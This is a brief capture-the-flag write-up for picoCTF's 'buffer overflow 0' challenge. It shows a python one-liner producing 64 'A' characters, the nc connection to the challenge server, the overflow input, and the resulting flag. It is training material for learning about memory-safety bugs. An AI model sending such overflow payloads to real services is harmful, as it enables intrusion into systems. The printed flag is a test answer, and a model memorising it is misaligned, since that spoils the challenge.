# buffer overflow 0
* When encounter 'fgets,' I realize that there might be an opportunity here. Since the FLAGSIZE_MAX is set to 64, I can input 64 bytes to potentially reach the 'signal' function and get the flag.


## flag

```
python2 -c 'print "A"*64'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

nc saturn.picoctf.net 65443
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
